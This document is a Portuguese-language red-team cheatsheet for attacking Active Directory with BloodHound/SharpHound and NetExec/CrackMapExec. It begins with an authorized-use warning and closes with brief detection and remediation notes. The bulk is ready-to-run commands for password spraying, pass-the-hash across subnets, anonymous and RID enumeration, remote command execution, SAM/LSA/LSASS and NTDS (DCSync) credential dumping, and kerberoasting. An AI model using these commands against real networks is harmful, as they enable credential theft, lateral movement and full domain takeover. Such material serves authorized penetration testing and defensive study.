# BloodHound + NetExec/CrackMapExec — Cheatsheet de Enumeração de AD

> **USO AUTORIZADO.** Coleta SharpHound/BloodHound e varreduras NetExec geram tráfego LDAP/SMB significativo e podem disparar alertas. Combine com o escopo aprovado e janelas acordadas.

---

## Parte 1 — Coleta (SharpHound)

SharpHound coleta objetos, sessões, ACLs e relações de confiança para o grafo BloodHound.

```cmd
:: Coleta completa (executável no host de domínio)
SharpHound.exe -c All

:: Métodos comuns separadamente
SharpHound.exe -c Group,LocalAdmin,Session,ACL,Trusts

:: Stealth (sem varrer todos os hosts; menos ruído de rede)
SharpHound.exe -c All --Stealth

:: Loop de sessões ao longo do tempo (captura logins)
SharpHound.exe -c Session --Loop --Loopduration 02:00:00

:: Definir DC/domínio e nome do zip de saída
SharpHound.exe -c All -d domain.local --domaincontroller 10.10.10.5 --zipfilename loot
```

### Coleta remota com BloodHound.py (sem tocar o host Windows)

```bash
# Coletor Python a partir do Linux
bloodhound-python -d domain.local -u user -p 'Senha' -c All -ns 10.10.10.5 --zip

# Pass-the-Hash
bloodhound-python -d domain.local -u user --hashes :<NThash> -c All -ns 10.10.10.5
```

### Coleta via NetExec (módulo BloodHound)

```bash
netexec ldap dc01.domain.local -u user -p 'Senha' --bloodhound -c All --dns-server 10.10.10.5
```

## Análise no BloodHound (BloodHound CE / Legacy)

Ingestão: subir o(s) `.json`/`.zip` na UI (BloodHound CE usa neo4j + servidor web).

**Pre-built queries úteis:**
- *Find all Domain Admins* / *Shortest Paths to Domain Admins*
- *Find Principals with DCSync Rights*
- *Find Computers with Unconstrained Delegation*
- *Shortest Paths to High Value Targets*
- *Find Kerberoastable Accounts*

**Cypher customizado (exemplos):**

```cypher
// Usuários kerberoastáveis (com SPN)
MATCH (u:User) WHERE u.hasspn=true RETURN u

// Contas AS-REP roastáveis
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u

// Computadores com delegação irrestrita (exceto DCs)
MATCH (c:Computer) WHERE c.unconstraineddelegation=true RETURN c

// Onde o usuário 'X' tem admin local
MATCH p=(u:User {name:'X@DOMAIN.LOCAL'})-[:AdminTo]->(c:Computer) RETURN p

// Caminho de um nó controlado até Domain Admins
MATCH p=shortestPath((u:User {name:'X@DOMAIN.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p
```

Marque os nós já comprometidos como *Owned* e use *Shortest Paths from Owned Principals* para mapear escalonamento real.

---

## Parte 2 — NetExec (nxc) / CrackMapExec

> NetExec (`nxc`) é o sucessor mantido do CrackMapExec (`cme`); a sintaxe é praticamente idêntica — troque `crackmapexec` por `netexec`/`nxc`.

### Enumeração inicial

```bash
# Identificar SO, hostname, domínio, SMB signing
nxc smb 10.10.10.0/24

# Null session / autenticação anônima
nxc smb 10.10.10.10 -u '' -p ''
nxc smb 10.10.10.10 -u 'guest' -p ''
```

### Validação de credenciais (spray e checagem)

```bash
# Validar par credencial/host (Pwn3d! = admin local)
nxc smb 10.10.10.10 -u user -p 'Senha'

# Password spraying (1 senha contra muitos usuários — cuidado com lockout!)
nxc smb dc01 -u users.txt -p 'Outono2025!' --continue-on-success

# Pass-the-Hash em sub-rede inteira
nxc smb 10.10.10.0/24 -u admin -H <NThash> --continue-on-success

# Kerberos
nxc smb dc01.domain.local -u user -p 'Senha' -k
```

### Pós-autenticação (enum)

```bash
# Shares e permissões de leitura/escrita
nxc smb 10.10.10.10 -u user -p 'Senha' --shares

# Usuários, grupos e política de senhas do domínio
nxc smb dc01 -u user -p 'Senha' --users
nxc smb dc01 -u user -p 'Senha' --groups
nxc smb dc01 -u user -p 'Senha' --pass-pol

# Sessões ativas e usuários logados
nxc smb 10.10.10.10 -u admin -p 'Senha' --loggedon-users --sessions

# RID brute force (enumerar SIDs sem privilégio)
nxc smb dc01 -u guest -p '' --rid-brute
```

### Spider e busca de arquivos sensíveis

```bash
nxc smb 10.10.10.10 -u user -p 'Senha' -M spider_plus
nxc smb 10.10.10.10 -u user -p 'Senha' --spider SHARE --pattern passw conf .config
```

### Execução de comandos e dump (com admin local)

```bash
# Execução de comando (escolhe psexec/wmi/atexec)
nxc smb 10.10.10.10 -u admin -p 'Senha' -x 'whoami /all'
nxc smb 10.10.10.10 -u admin -p 'Senha' -X '$PSVersionTable'   # PowerShell

# Dump SAM, LSA e LSASS
nxc smb 10.10.10.10 -u admin -p 'Senha' --sam
nxc smb 10.10.10.10 -u admin -p 'Senha' --lsa
nxc smb 10.10.10.10 -u admin -p 'Senha' -M lsassy

# DCSync via módulo (contra DC, com privilégios de replicação)
nxc smb dc01 -u admin -p 'Senha' --ntds
```

### Outros protocolos

```bash
nxc ldap dc01 -u user -p 'Senha' --kerberoasting kerb.out
nxc ldap dc01 -u user -p 'Senha' --asreproast asrep.out
nxc winrm 10.10.10.10 -u admin -p 'Senha' -x whoami
nxc mssql 10.10.10.20 -u sa -p 'Senha' --local-auth -x 'whoami'
nxc ssh 10.10.10.30 -u user -p 'Senha'
```

## Notas de detecção e remediação

- **Coleta SharpHound/LDAP:** monitorar consultas LDAP volumosas e acessos a `\\*\IPC$` em massa; detectar via assinaturas de tráfego (ex.: regras Zeek/Defender). Reduzir exposição: limpar ACLs perigosas, remover delegação irrestrita, aplicar tiering.
- **Password spraying (nxc):** habilitar lockout inteligente, alertar em Event 4625 distribuído por muitas contas a partir de uma origem; usar `--jitter` no atacante revela que detecção temporal é viável defensivamente.
- **SMB signing desabilitado** (visível em `nxc smb`): forçar SMB signing para mitigar relay NTLM.
- **RID brute / null session:** restringir enumeração anônima (`RestrictAnonymous`, `RestrictRemoteSAM`).
- **Dump LSASS/SAM:** Credential Guard, PPL para LSASS, alertar em acesso de processos não-confiáveis ao `lsass.exe`.
